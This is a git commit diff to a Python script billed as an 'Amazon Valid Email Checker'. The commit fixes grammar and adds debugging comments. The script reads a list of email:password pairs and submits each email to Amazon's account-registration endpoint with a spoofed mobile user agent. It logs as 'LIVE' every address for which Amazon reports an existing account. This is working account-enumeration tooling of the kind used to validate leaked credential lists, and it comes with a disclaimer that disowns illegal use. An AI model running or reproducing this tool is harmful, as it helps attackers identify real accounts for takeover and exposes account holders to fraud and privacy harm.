c26692272bd91bca7299e8baa835e63bf4621e21
botmaker69 <61641475+botmaker69@users.noreply.github.com>
2022-08-12 15:31:54 -0400

    fix grammar + add debugging

--- check.py
+++ check.py
@@ -6,10 +6,16 @@ print ("Amazon Valid Email Checker by Casein")
 print("I dont't Accept any Responsibility for any illegal usage!")
 print("_"*55)
 list = input("Input Mail List :");
-link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
+link = "https://www.amazon.com/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F_encoding%3DUTF8%26ref_%3Dnav_newcust&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&"
 head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
 s = requests.session()
-g = s.get(link, headers=head)
+g = s.get(link, headers=head) #add verify=False to use a self signed certificate
+#for debugging
+
+#s.proxies = {
+#   'http': 'http://127.0.0.1:8000',
+#   'https': 'http://127.0.0.1:8080',
+#}
 list = open(list, 'r')
 print("-"*55)
 while True:
@@ -17,9 +23,9 @@ while True:
 	if not email:
 		break
 	mail = email.strip().split(':')
-	xxx = {'customerName':'Casein Nitrate','email': mail[0],'emailCheck': mail[0],'password':'BirdyBirdySad012','passwordCheck':'BirdyBirdySad012'}
-	cek = s.post(link, headers=head, data=xxx).text
-	if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
+	xxx = {'customerName':'Casein Nitrate','email': mail[0],'password':'BirdyBirdySad012','passwordCheck':'BirdyBirdySad012'}
+	cek = s.post(link, headers=head, data=xxx).text #add verify=False to use a self signed certificate
+	if "You indicated you're a new customer, but an account already exists with the email address" in cek:
 		print("\033[32;1mLIVE\033[0m | "+email+" | [(Checked)]")
 		live.write(email + '\n')
 	else:
